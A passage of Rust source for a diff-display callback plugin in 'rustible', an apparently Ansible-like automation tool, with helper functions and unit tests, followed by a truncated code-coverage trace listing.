fn with_line_numbers(mut self, show: bool) -\u003e Self {\n        self.show_line_numbers = show;\n        self\n    }\n\n    /// Set maximum lines to display.\n    pub fn with_max_lines(mut self, max: usize) -\u003e Self {\n        self.max_lines = max;\n        self\n    }\n}\n\n/// Statistics for diff output tracking.\n#[derive(Debug, Clone, Default)]\nstruct DiffStats {\n    /// Number of files with diffs shown\n    files_diffed: u32,\n    /// Total lines added\n    lines_added: u32,\n    /// Total lines removed\n    lines_removed: u32,\n}\n\n/// Diff callback plugin that displays before/after changes.\n///\n/// This callback is designed to provide visibility into what changes\n/// are being made during playbook execution, particularly for file\n/// modifications.\n///\n/// # Design Principles\n///\n/// 1. **Unified Format**: Uses standard unified diff format\n/// 2. **Color Coded**: Green for additions, red for deletions\n/// 3. **Composable**: Works with `CompositeCallback` for combined output\n/// 4. **Configurable**: Context lines, colors, line numbers\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::diff::{DiffCallback, DiffConfig};\n///\n/// // Basic usage with defaults\n/// let callback = DiffCallback::new();\n///\n/// // With custom configuration\n/// let config = DiffConfig::default()\n///     .with_context_lines(5)\n///     .with_color(true);\n/// let callback = DiffCallback::with_config(config);\n/// ```\n#[derive(Debug)]\npub struct DiffCallback {\n    /// Configuration for diff output\n    config: DiffConfig,\n    /// Statistics for tracking diffs\n    stats: Arc\u003cRwLock\u003cDiffStats\u003e\u003e,\n    /// Current task name for context\n    current_task: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Playbook start time\n    start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n}\n\nimpl DiffCallback {\n    /// Creates a new diff callback with default configuration.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = DiffCallback::new();\n    /// ```\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self::with_config(DiffConfig::default())\n    }\n\n    /// Creates a new diff callback with custom configuration.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let config = DiffConfig::default().with_context_lines(5);\n    /// let callback = DiffCallback::with_config(config);\n    /// ```\n    #[must_use]\n    pub fn with_config(config: DiffConfig) -\u003e Self {\n        Self {\n            config,\n            stats: Arc::new(RwLock::new(DiffStats::default())),\n            current_task: Arc::new(RwLock::new(None)),\n            start_time: Arc::new(RwLock::new(None)),\n        }\n    }\n\n    /// Creates a callback that only shows diffs (enabled mode).\n    pub fn enabled() -\u003e Self {\n        Self::with_config(DiffConfig::enabled())\n    }\n\n    /// Creates a callback that suppresses diffs (disabled mode).\n    pub fn disabled() -\u003e Self {\n        Self::with_config(DiffConfig::disabled())\n    }\n\n    /// Returns whether diff mode is enabled.\n    pub fn is_enabled(\u0026self) -\u003e bool {\n        self.config.enabled\n    }\n\n    /// Set whether diff mode is enabled.\n    pub fn set_enabled(\u0026mut self, enabled: bool) {\n        self.config.enabled = enabled;\n    }\n\n    /// Generates and prints a unified diff between before and after content.\n    ///\n    /// Returns the number of lines added and removed.\n    fn print_unified_diff(\n        \u0026self,\n        before: \u0026str,\n        after: \u0026str,\n        before_header: Option\u003c\u0026str\u003e,\n        after_header: Option\u003c\u0026str\u003e,\n    ) -\u003e (u32, u32) {\n        let diff = TextDiff::from_lines(before, after);\n\n        let before_label = before_header.unwrap_or(\"before\");\n        let after_label = after_header.unwrap_or(\"after\");\n\n        let mut lines_added = 0u32;\n        let mut lines_removed = 0u32;\n        let mut output_lines = 0usize;\n\n        // Print diff header\n        if self.config.use_color {\n            println!(\"{} {}\", \"---\".red(), before_label.red());\n            println!(\"{} {}\", \"+++\".green(), after_label.green());\n        } else {\n            println!(\"--- {}\", before_label);\n            println!(\"+++ {}\", after_label);\n        }\n\n        // Generate unified diff with context\n        let unified = diff.unified_diff();\n\n        for hunk in unified.iter_hunks() {\n            // Print hunk header using the header() method\n            let header = hunk.header();\n            if self.config.use_color {\n                println!(\"{}\", header.to_string().cyan());\n            } else {\n                println!(\"{}\", header);\n            }\n\n            for change in hunk.iter_changes() {\n                // Check max lines limit\n                if self.config.max_lines \u003e 0 \u0026\u0026 output_lines \u003e= self.config.max_lines {\n                    let remaining_changes = hunk.iter_changes().count();\n                    if self.config.use_color {\n                        println!(\n                            \"{}\",\n                            format!(\"... ({} more changes)\", remaining_changes).bright_black()\n                        );\n                    } else {\n                        println!(\"... ({} more changes)\", remaining_changes);\n                    }\n                    break;\n                }\n\n                let line = change.value();\n                let line_content = line.strip_suffix('\\n').unwrap_or(line);\n\n                match change.tag() {\n                    ChangeTag::Delete =\u003e {\n                        lines_removed += 1;\n                        output_lines += 1;\n                        if self.config.use_color {\n                            println!(\"{}{}\", \"-\".red(), line_content.red());\n                        } else {\n                            println!(\"-{}\", line_content);\n                        }\n                    }\n                    ChangeTag::Insert =\u003e {\n                        lines_added += 1;\n                        output_lines += 1;\n                        if self.config.use_color {\n                            println!(\"{}{}\", \"+\".green(), line_content.green());\n                        } else {\n                            println!(\"+{}\", line_content);\n                        }\n                    }\n                    ChangeTag::Equal =\u003e {\n                        output_lines += 1;\n                        println!(\" {}\", line_content);\n                    }\n                }\n            }\n        }\n\n        (lines_added, lines_removed)\n    }\n\n    /// Formats a task diff for display.\n    async fn display_task_diff(\u0026self, diff: \u0026TaskDiff) {\n        if !self.config.enabled {\n            return;\n        }\n\n        let before = diff.before.as_deref().unwrap_or(\"\");\n        let after = diff.after.as_deref().unwrap_or(\"\");\n\n        // Skip if no actual changes\n        if before == after {\n            return;\n        }\n\n        let before_header = diff.before_header.as_deref();\n        let after_header = diff.after_header.as_deref();\n\n        let (added, removed) = self.print_unified_diff(before, after, before_header, after_header);\n\n        // Update stats\n        let mut stats = self.stats.write().await;\n        stats.files_diffed += 1;\n        stats.lines_added += added;\n        stats.lines_removed += removed;\n    }\n\n    /// Formats a module diff for display.\n    #[allow(dead_code)]\n    async fn display_module_diff(\u0026self, diff: \u0026ModuleDiff) {\n        if !self.config.enabled {\n            return;\n        }\n\n        // Print description if available\n        if !diff.description.is_empty() {\n            if self.config.use_color {\n                println!(\"{}: {}\", \"Diff\".bright_white().bold(), diff.description);\n            } else {\n                println!(\"Diff: {}\", diff.description);\n            }\n        }\n\n        let before = diff.before.as_deref().unwrap_or(\"\");\n        let after = diff.after.as_deref().unwrap_or(\"\");\n\n        // Skip if no actual content to diff\n        if before.is_empty() \u0026\u0026 after.is_empty() {\n            return;\n        }\n\n        let (added, removed) = self.print_unified_diff(before, after, None, None);\n\n        // Update stats\n        let mut stats = self.stats.write().await;\n        stats.files_diffed += 1;\n        stats.lines_added += added;\n        stats.lines_removed += removed;\n    }\n\n    /// Returns statistics about diffs shown during execution.\n    pub async fn get_stats(\u0026self) -\u003e (u32, u32, u32) {\n        let stats = self.stats.read().await;\n        (stats.files_diffed, stats.lines_added, stats.lines_removed)\n    }\n\n    /// Prints a summary of diff statistics.\n    pub async fn print_summary(\u0026self) {\n        if !self.config.enabled {\n            return;\n        }\n\n        let stats = self.stats.read().await;\n\n        if stats.files_diffed \u003e 0 {\n            println!();\n            if self.config.use_color {\n                println!(\n                    \"{}: {} file(s), {} insertion(s)({}), {} deletion(s)({})\",\n                    \"Diff Summary\".bright_white().bold(),\n                    stats.files_diffed,\n                    stats.lines_added,\n                    \"+\".green(),\n                    stats.lines_removed,\n                    \"-\".red(),\n                );\n            } else {\n                println!(\n                    \"Diff Summary: {} file(s), {} insertion(s)(+), {} deletion(s)(-)\",\n                    stats.files_diffed, stats.lines_added, stats.lines_removed,\n                );\n            }\n        }\n    }\n}\n\nimpl Default for DiffCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for DiffCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            stats: Arc::clone(\u0026self.stats),\n            current_task: Arc::clone(\u0026self.current_task),\n            start_time: Arc::clone(\u0026self.start_time),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for DiffCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut start_time = self.start_time.write().await;\n        *start_time = Some(Instant::now());\n\n        // Reset stats for new playbook\n        let mut stats = self.stats.write().await;\n        *stats = DiffStats::default();\n\n        let _ = name;\n    }\n\n    async fn on_playbook_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Print diff summary at the end\n        self.print_summary().await;\n    }\n\n    async fn on_play_start(\u0026self, _name: \u0026str, _hosts: \u0026[String]) {\n        // No action needed for diff callback\n    }\n\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // No action needed for diff callback\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, _host: \u0026str) {\n        let mut current = self.current_task.write().await;\n        *current = Some(name.to_string());\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        if !self.config.enabled {\n            return;\n        }\n\n        // Check if the result has diff data\n        if let Some(ref data) = result.result.data {\n            // Try to extract diff from module result data\n            if let Some(diff_obj) = data.get(\"diff\") {\n                if let Ok(task_diff) = serde_json::from_value::\u003cTaskDiff\u003e(diff_obj.clone()) {\n                    self.display_task_diff(\u0026task_diff).await;\n                }\n            }\n\n            // Also check for before/after fields directly\n            let before = data.get(\"before\").and_then(|v| v.as_str());\n            let after = data.get(\"after\").and_then(|v| v.as_str());\n\n            if before.is_some() || after.is_some() {\n                let task_diff = TaskDiff {\n                    before: before.map(String::from),\n                    after: after.map(String::from),\n                    before_header: data\n                        .get(\"path\")\n                        .and_then(|v| v.as_str())\n                        .map(|p| format!(\"before: {}\", p)),\n                    after_header: data\n                        .get(\"path\")\n                        .and_then(|v| v.as_str())\n                        .map(|p| format!(\"after: {}\", p)),\n                };\n                self.display_task_diff(\u0026task_diff).await;\n            }\n        }\n    }\n\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // No action needed for diff callback\n    }\n\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // No action needed for diff callback\n    }\n}\n\n/// A composite callback that combines multiple callbacks.\n///\n/// This allows using the DiffCallback alongside other callbacks\n/// like the DefaultCallback or MinimalCallback.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::diff::{DiffCallback, CompositeCallback};\n/// use rustible::callback::plugins::minimal::MinimalCallback;\n///\n/// let composite = CompositeCallback::new()\n///     .with_callback(Box::new(MinimalCallback::new()))\n///     .with_callback(Box::new(DiffCallback::new()));\n/// ```\npub struct CompositeCallback {\n    callbacks: Vec\u003cBox\u003cdyn ExecutionCallback\u003e\u003e,\n}\n\nimpl std::fmt::Debug for CompositeCallback {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        f.debug_struct(\"CompositeCallback\")\n            .field(\"callbacks_count\", \u0026self.callbacks.len())\n            .finish()\n    }\n}\n\nimpl CompositeCallback {\n    /// Creates a new empty composite callback.\n    pub fn new() -\u003e Self {\n        Self {\n            callbacks: Vec::new(),\n        }\n    }\n\n    /// Adds a callback to the composite.\n    pub fn with_callback(mut self, callback: Box\u003cdyn ExecutionCallback\u003e) -\u003e Self {\n        self.callbacks.push(callback);\n        self\n    }\n\n    /// Adds a callback to the composite (mutable version).\n    pub fn add_callback(\u0026mut self, callback: Box\u003cdyn ExecutionCallback\u003e) {\n        self.callbacks.push(callback);\n    }\n}\n\nimpl Default for CompositeCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for CompositeCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        for callback in \u0026self.callbacks {\n            callback.on_playbook_start(name).await;\n        }\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        for callback in \u0026self.callbacks {\n            callback.on_playbook_end(name, success).await;\n        }\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        for callback in \u0026self.callbacks {\n            callback.on_play_start(name, hosts).await;\n        }\n    }\n\n    async fn on_play_end(\u0026self, name: \u0026str, success: bool) {\n        for callback in \u0026self.callbacks {\n            callback.on_play_end(name, success).await;\n        }\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        for callback in \u0026self.callbacks {\n            callback.on_task_start(name, host).await;\n        }\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        for callback in \u0026self.callbacks {\n            callback.on_task_complete(result).await;\n        }\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        for callback in \u0026self.callbacks {\n            callback.on_handler_triggered(name).await;\n        }\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        for callback in \u0026self.callbacks {\n            callback.on_facts_gathered(host, facts).await;\n        }\n    }\n}\n\n/// Helper function to generate a unified diff string.\n///\n/// This can be used independently of the callback for generating\n/// diff output programmatically.\n///\n/// # Arguments\n///\n/// * `before` - The original content\n/// * `after` - The modified content\n/// * `context_lines` - Number of context lines (default: 3)\n///\n/// # Returns\n///\n/// A string containing the unified diff output.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::diff::generate_diff;\n///\n/// let before = \"line1\\nline2\\nline3\";\n/// let after = \"line1\\nmodified\\nline3\";\n/// let diff = generate_diff(before, after, 3);\n/// println!(\"{}\", diff);\n/// ```\npub fn generate_diff(before: \u0026str, after: \u0026str, _context_lines: usize) -\u003e String {\n    let diff = TextDiff::from_lines(before, after);\n    let mut output = String::new();\n\n    output.push_str(\"--- before\\n\");\n    output.push_str(\"+++ after\\n\");\n\n    let unified = diff.unified_diff();\n\n    for hunk in unified.iter_hunks() {\n        // Use Display trait for the header\n        output.push_str(\u0026format!(\"{}\\n\", hunk.header()));\n\n        for change in hunk.iter_changes() {\n            let line = change.value();\n            let line_content = line.strip_suffix('\\n').unwrap_or(line);\n\n            match change.tag() {\n                ChangeTag::Delete =\u003e {\n                    output.push_str(\u0026format!(\"-{}\\n\", line_content));\n                }\n                ChangeTag::Insert =\u003e {\n                    output.push_str(\u0026format!(\"+{}\\n\", line_content));\n                }\n                ChangeTag::Equal =\u003e {\n                    output.push_str(\u0026format!(\" {}\\n\", line_content));\n                }\n            }\n        }\n    }\n\n    output\n}\n\n/// Helper function to check if two strings have differences.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::diff::has_changes;\n///\n/// assert!(has_changes(\"old\", \"new\"));\n/// assert!(!has_changes(\"same\", \"same\"));\n/// ```\npub fn has_changes(before: \u0026str, after: \u0026str) -\u003e bool {\n    before != after\n}\n\n/// Counts the number of lines added and removed between two strings.\n///\n/// # Returns\n///\n/// A tuple of (lines_added, lines_removed).\npub fn count_changes(before: \u0026str, after: \u0026str) -\u003e (usize, usize) {\n    let diff = TextDiff::from_lines(before, after);\n    let mut added = 0;\n    let mut removed = 0;\n\n    for change in diff.iter_all_changes() {\n        match change.tag() {\n            ChangeTag::Insert =\u003e added += 1,\n            ChangeTag::Delete =\u003e removed += 1,\n            ChangeTag::Equal =\u003e {}\n        }\n    }\n\n    (added, removed)\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    #[test]\n    fn test_diff_config_default() {\n        let config = DiffConfig::default();\n        assert_eq!(config.context_lines, 3);\n        assert!(config.use_color);\n        assert!(config.show_line_numbers);\n        assert_eq!(config.max_lines, 100);\n        assert!(config.enabled);\n    }\n\n    #[test]\n    fn test_diff_config_builder() {\n        let config = DiffConfig::default()\n            .with_context_lines(5)\n            .with_color(false)\n            .with_line_numbers(false)\n            .with_max_lines(50);\n\n        assert_eq!(config.context_lines, 5);\n        assert!(!config.use_color);\n        assert!(!config.show_line_numbers);\n        assert_eq!(config.max_lines, 50);\n    }\n\n    #[test]\n    fn test_diff_config_enabled_disabled() {\n        let enabled = DiffConfig::enabled();\n        assert!(enabled.enabled);\n\n        let disabled = DiffConfig::disabled();\n        assert!(!disabled.enabled);\n    }\n\n    #[test]\n    fn test_diff_callback_creation() {\n        let callback = DiffCallback::new();\n        assert!(callback.is_enabled());\n\n        let callback = DiffCallback::enabled();\n        assert!(callback.is_enabled());\n\n        let callback = DiffCallback::disabled();\n        assert!(!callback.is_enabled());\n    }\n\n    #[test]\n    fn test_generate_diff() {\n        let before = \"line1\\nline2\\nline3\\n\";\n        let after = \"line1\\nmodified\\nline3\\n\";\n\n        let diff = generate_diff(before, after, 3);\n\n        assert!(diff.contains(\"--- before\"));\n        assert!(diff.contains(\"+++ after\"));\n        assert!(diff.contains(\"-line2\"));\n        assert!(diff.contains(\"+modified\"));\n    }\n\n    #[test]\n    fn test_generate_diff_no_changes() {\n        let content = \"line1\\nline2\\nline3\\n\";\n        let diff = generate_diff(content, content, 3);\n\n        // Should still have headers but no change markers\n        assert!(diff.contains(\"--- before\"));\n        assert!(diff.contains(\"+++ after\"));\n        // No hunks when content is identical\n    }\n\n    #[test]\n    fn test_has_changes() {\n        assert!(has_changes(\"old\", \"new\"));\n        assert!(!has_changes(\"same\", \"same\"));\n        assert!(has_changes(\"\", \"something\"));\n        assert!(has_changes(\"something\", \"\"));\n    }\n\n    #[test]\n    fn test_count_changes() {\n        let before = \"line1\\nline2\\nline3\\n\";\n        let after = \"line1\\nmodified\\nline3\\nnew_line\\n\";\n\n        let (added, removed) = count_changes(before, after);\n\n        assert_eq!(removed, 1); // line2 removed\n        assert_eq!(added, 2); // modified + new_line added\n    }\n\n    #[test]\n    fn test_count_changes_no_diff() {\n        let content = \"line1\\nline2\\n\";\n        let (added, removed) = count_changes(content, content);\n\n        assert_eq!(added, 0);\n        assert_eq!(removed, 0);\n    }\n\n    #[tokio::test]\n    async fn test_diff_callback_stats() {\n        let callback = DiffCallback::new();\n\n        // Initial stats should be zero\n        let (files, added, removed) = callback.get_stats().await;\n        assert_eq!(files, 0);\n        assert_eq!(added, 0);\n        assert_eq!(removed, 0);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = DiffCallback::new();\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying state\n        assert!(Arc::ptr_eq(\u0026callback1.stats, \u0026callback2.stats));\n        assert!(Arc::ptr_eq(\n            \u0026callback1.current_task,\n            \u0026callback2.current_task\n        ));\n    }\n\n    #[test]\n    fn test_composite_callback_creation() {\n        let composite = CompositeCallback::new();\n        assert!(composite.callbacks.is_empty());\n    }\n\n    #[tokio::test]\n    async fn test_composite_callback_with_diff() {\n        let mut composite = CompositeCallback::new();\n        composite.add_callback(Box::new(DiffCallback::new()));\n\n        // Should not panic\n        composite.on_playbook_start(\"test\").await;\n        composite.on_task_start(\"task\", \"host\").await;\n        composite.on_playbook_end(\"test\", true).await;\n    }\n\n    #[test]\n    fn test_diff_with_empty_content() {\n        // Test adding new content\n        let (added, removed) = count_changes(\"\", \"new content\\n\");\n        assert_eq!(added, 1);\n        assert_eq!(removed, 0);\n\n        // Test removing all content\n        let (added, removed) = count_changes(\"old content\\n\", \"\");\n        assert_eq!(added, 0);\n        assert_eq!(removed, 1);\n    }\n\n    #[test]\n    fn test_diff_multiline() {\n        let before = \"header\\nline1\\nline2\\nline3\\nfooter\\n\";\n        let after = \"header\\nline1\\nMODIFIED\\nline3\\nfooter\\n\";\n\n        let diff = generate_diff(before, after, 1);\n\n        assert!(diff.contains(\"-line2\"));\n        assert!(diff.contains(\"+MODIFIED\"));\n        // Context lines should be present\n        assert!(diff.contains(\" line1\"));\n        assert!(diff.contains(\" line3\"));\n    }\n\n    fn _create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n}\n","traces":[{"line":58,"address":[33286336],"length":1,"stats":{"Line":1}},{"line":71,"address":[33292176],"length":1,"stats":{"Line":1}},{"line":72,"address":[33292184],"length":1,"stats":{"Line":1}},{"line":76,"address":[33292208],"length":1,"stats":{"Line":1}},{"line":84,"address":[33292128],"length":1,"stats":{"Line":1}},{"line":85,"address":[33292136],"length":1,"stats":{"Line":1}},{"line":86,"address":[33292139],"length":1,"stats":{"Line":1}},{"line":90,"address":[33291984],"length":1,"stats":{"Line":1}},{"line":91,"address":[33291998],"length":1,"stats":{"Line":1}},{"line":92,"address":[33292004],"length":1,"stats":{"Line":1}},{"line":96,"address":[33292080],"length":1,"stats":{"Line":1}},{"line":97,"address":[33292094],"length":1,"stats":{"Line":1}},{"line":98,"address":[33292100],"length":1,"stats":{"Line":1}},{"line":102,"address":[33292032],"length":1,"stats":{"Line":1}},{"line":103,"address":[33292040],"length":1,"stats":{"Line":1}},{"line":104,"address":[33292044],"length":1,"stats":{"Line":1}},{"line":167,"address":[33297584],"length":1,"stats":{"Line":1}},{"line":168,"address":[33297597],"length":1,"stats":{"Line":1}},{"line":180,"address":[33292384,33292743],"length":1,"stats":{"Line":1}},{"line":183,"address":[33292419],"length":1,"stats":{"Line":1}},{"line":184,"address":[33292559,33292476],"length":1,"stats":{"Line":2}},{"line":185,"address":[33292584,33292656],"length":1,"stats":{"Line":2}},{"line":190,"address":[33297632],"length":1,"stats":{"Line":1}},{"line":191,"address":[33297645],"length":1,"stats":{"Line":1}},{"line":195,"address":[33297680],"length":1,"stats":{"Line":1}},{"line":196,"address":[33297693],"length":1,"stats":{"Line":1}},{"line":200,"address":[33292336],"length":1,"stats":{"Line":1}},{"line":201,"address":[33292341],"length":1,"stats":{"Line":1}},{"line":205,"address":[33292352],"length":1,"stats":{"Line":0}},{"line":206,"address":[33292369],"length":1,"stats":{"Line":0}},{"line":212,"address":[33297530,33292816,33296376],"length":1,"stats":{"Line":0}},{"line":219,"address":[33292973],"length":1,"stats":{"Line":0}},{"line":221,"address":[33292994,33293109],"length":1,"stats":{"Line":0}},{"line":222,"address":[33293125],"length":1,"stats":{"Line":0}},{"line":224,"address":[33293204],"length":1,"stats":{"Line":0}},{"line":225,"address":[33293215],"length":1,"stats":{"Line":0}},{"line":226,"address":[33293226],"length":1,"stats":{"Line":0}},{"line":229,"address":[33293238],"length":1,"stats":{"Line":0}},{"line":230,"address":[33293279,33293518],"length":1,"stats":{"Line":0}},{"line":231,"address":[33293839],"length":1,"stats":{"Line":0}},{"line":233,"address":[33293252,33293313],"length":1,"stats":{"Line":0}},{"line":234,"address":[33293390],"length":1,"stats":{"Line":0}},{"line":238,"address":[33293488],"length":1,"stats":{"Line":0}},{"line":240,"address":[33294194,33294389,33294265],"length":1,"stats":{"Line":0}},{"line":242,"address":[33294474],"length":1,"stats":{"Line":0}},{"line":243,"address":[33294661],"length":1,"stats":{"Line":0}},{"line":244,"address":[33294834,33294718],"length":1,"stats":{"Line":0}},{"line":246,"address":[33294675,33294725],"length":1,"stats":{"Line":0}},{"line":249,"address":[33294796,33295141],"length":1,"stats":{"Line":0}},{"line":251,"address":[33295333,33295263],"length":1,"stats":{"Line":0}},{"line":252,"address":[33295347,33296963],"length":1,"stats":{"Line":0}},{"line":253,"address":[33296996],"length":1,"stats":{"Line":0}},{"line":254,"address":[33297352,33297271],"length":1,"stats":{"Line":0}},{"line":259,"address":[33297010,33297072],"length":1,"stats":{"Line":0}},{"line":264,"address":[33295302,33295393],"length":1,"stats":{"Line":0}},{"line":265,"address":[33295425],"length":1,"stats":{"Line":0}},{"line":267,"address":[33295518],"length":1,"stats":{"Line":0}},{"line":269,"address":[33295603,33295841,33295807],"length":1,"stats":{"Line":0}},{"line":270,"address":[33295814,33295891,33295875],"length":1,"stats":{"Line":0}},{"line":271,"address":[33295883],"length":1,"stats":{"Line":0}},{"line":272,"address":[33295947,33296052],"length":1,"stats":{"Line":0}},{"line":274,"address":[33295920,33295978],"length":1,"stats":{"Line":0}},{"line":278,"address":[33295632,33296420,33296386],"length":1,"stats":{"Line":0}},{"line":279,"address":[33296454,33296393,33296470],"length":1,"stats":{"Line":0}},{"line":280,"address":[33296462],"length":1,"stats":{"Line":0}},{"line":281,"address":[33296526,33296631],"length":1,"stats":{"Line":0}},{"line":283,"address":[33296557,33296499],"length":1,"stats":{"Line":0}},{"line":287,"address":[33295666,33295576,33295709],"length":1,"stats":{"Line":0}},{"line":288,"address":[33295682,33295729],"length":1,"stats":{"Line":0}},{"line":294,"address":[33294523],"length":1,"stats":{"Line":0}},{"line":298,"address":[32654035,32654604,32653200,32653104,32653072,32653329],"length":1,"stats":{"Line":0}},{"line":299,"address":[32653192],"length":1,"stats":{"Line":0}},{"line":303,"address":[32653253,32653395],"length":1,"stats":{"Line":0}},{"line":304,"address":[32653480],"length":1,"stats":{"Line":0}},{"line":307,"address":[32653620],"length":1,"stats":{"Line":0}},{"line":311,"address":[32653670],"length":1,"stats":{"Line":0}},{"line":312,"address":[32653762],"length":1,"stats":{"Line":0}},{"line":314,"address":[32653845],"length":1,"stats":{"Line":0}},{"line":317,"address":[25994727],"length":1,"stats":{"Line":0}},{"line":318,"address":[32654296,32654353,32654417],"length":1,"stats":{"Line":0}},{"line":319,"address":[32654446,32654387,32654511],"length":1,"stats":{"Line":0}},{"line":320,"address":[32654481,32654538,32654583],"length":1,"stats":{"Line":0}},{"line":325,"address":[33297552,33297565],"length":1,"stats":{"Line":0}},{"line":326,"address":[32654740],"length":1,"stats":{"Line":0}},{"line":331,"address":[32654801,32654906],"length":1,"stats":{"Line":0}},{"line":332,"address":[32654920],"length":1,"stats":{"Line":0}},{"line":333,"address":[32655110,32655005],"length":1,"stats":{"Line":0}},{"line":335,"address":[32654978,32655036],"length":1,"stats":{"Line":0}},{"line":339,"address":[32655388,32654936],"length":1,"stats":{"Line":0}},{"line":340,"address":[32655484],"length":1,"stats":{"Line":0}},{"line":343,"address":[32655629,32655731],"length":1,"stats":{"Line":0}},{"line":347,"address":[32655690,32655781],"length":1,"stats":{"Line":0}},{"line":350,"address":[32654778,32655787,32655930],"length":1,"stats":{"Line":0}},{"line":351,"address":[32656210,32656271,32656153],"length":1,"stats":{"Line":0}},{"line":352,"address":[32656362,32656244,32656300],"length":1,"stats":{"Line":0}},{"line":353,"address":[32656335,32656389,32656434],"length":1,"stats":{"Line":0}},{"line":357,"address":[32656499,32657262,32656598,32656464,32656728,32656559],"length":1,"stats":{"Line":4}},{"line":358,"address":[32656547,32656586,32656650,32656759],"length":1,"stats":{"Line":2}},{"line":359,"address":[32657171,32657032,32656978,32657097],"length":1,"stats":{"Line":4}},{"line":363,"address":[32651421,32651260,32651232,32653054,32651551,32651316],"length":1,"stats":{"Line":4}},{"line":364,"address":[32651304],"length":1,"stats":{"Line":1}},{"line":368,"address":[25981348],"length":1,"stats":{"Line":2}},{"line":370,"address":[32651811,32651868],"length":1,"stats":{"Line":2}},{"line":371,"address":[32651875,32651919],"length":1,"stats":{"Line":0}},{"line":372,"address":[32651943,32653049,32652286],"length":1,"stats":{"Line":0}},{"line":373,"address":[32652455],"length":1,"stats":{"Line":0}},{"line":383,"address":[32652015,32652049,32651961],"length":1,"stats":{"Line":0}},{"line":393,"address":[33301120],"length":1,"stats":{"Line":0}},{"line":394,"address":[33301128],"length":1,"stats":{"Line":0}},{"line":399,"address":[33286000,33286236,33286230],"length":1,"stats":{"Line":1}},{"line":401,"address":[33286024],"length":1,"stats":{"Line":1}},{"line":402,"address":[33286043],"length":1,"stats":{"Line":1}},{"line":403,"address":[33286058,33286115],"length":1,"stats":{"Line":2}},{"line":404,"address":[33286120],"length":1,"stats":{"Line":1}},{"line":411,"address":[32645323,32645145,32645179,32645081,32645056,32645199,32645778,32646126],"length":1,"stats":{"Line":4}},{"line":412,"address":[32645125,32645172,32645354,32645251],"length":1,"stats":{"Line":2}},{"line":413,"address":[32645546,32645630],"length":1,"stats":{"Line":2}},{"line":416,"address":[26119870],"length":1,"stats":{"Line":1}},{"line":417,"address":[32646052,32645997],"length":1,"stats":{"Line":2}},{"line":422,"address":[32641904,32642144,32641929,32642309,32642335,32642045,32642009],"length":1,"stats":{"Line":4}},{"line":424,"address":[32642002,32642033,32642100,32642175],"length":1,"stats":{"Line":2}},{"line":427,"address":[33281741],"length":1,"stats":{"Line":0}},{"line":431,"address":[33281675],"length":1,"stats":{"Line":0}},{"line":435,"address":[33281823],"length":1,"stats":{"Line":4}},{"line":436,"address":[32641315,32641212,32641105,32641148],"length":1,"stats":{"Line":2}},{"line":437,"address":[32641846,32641541,32641633,32641514,32641695],"length":1,"stats":{"Line":1}},{"line":440,"address":[33281991],"length":1,"stats":{"Line":0}},{"line":441,"address":[32642436],"length":1,"stats":{"Line":0}},{"line":446,"address":[32642596,32642522],"length":1,"stats":{"Line":0}},{"line":448,"address":[32642608,32642696],"length":1,"stats":{"Line":0}},{"line":449,"address":[32642934,32642759,32642816],"length":1,"stats":{"Line":0}},{"line":450,"address":[26116673],"length":1,"stats":{"Line":0}},{"line":455,"address":[32644777,32643493,32642774,32644768],"length":1,"stats":{"Line":0}},{"line":456,"address":[32644592,32644601,32643555],"length":1,"stats":{"Line":0}},{"line":458,"address":[32643743,32643652],"length":1,"stats":{"Line":0}},{"line":460,"address":[32643716],"length":1,"stats":{"Line":0}},{"line":461,"address":[32643760],"length":1,"stats":{"Line":0}},{"line":462,"address":[32643835],"length":1,"stats":{"Line":0}},{"line":466,"address":[32643959],"length":1,"stats":{"Line":0}},{"line":471,"address":[32642499,32644380,32644198,32644277],"length":1,"stats":{"Line":0}},{"line":476,"address":[33282179],"length":1,"stats":{"